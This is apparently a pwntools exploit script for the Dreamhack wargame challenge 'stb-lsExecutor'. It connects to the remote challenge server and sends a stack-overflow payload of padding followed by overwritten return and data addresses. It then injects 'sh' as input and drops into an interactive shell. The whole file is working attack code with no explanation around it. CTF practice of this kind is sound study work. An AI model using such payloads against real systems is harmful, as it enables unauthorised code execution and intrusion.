from pwn import *

#p = process('./stb-lsExecutor')
p = remote('host3.dreamhack.games', '18421')
payload = b"A" * 0x30 + p64(0x4040e9) # sel + 0x70
payload += p64(0x4013cb)

p.sendafter(b"option : ", b"A" * 60)
p.sendafter(b"path : ", payload)
p.sendafter(b"y/n", b"sh")

p.interactive()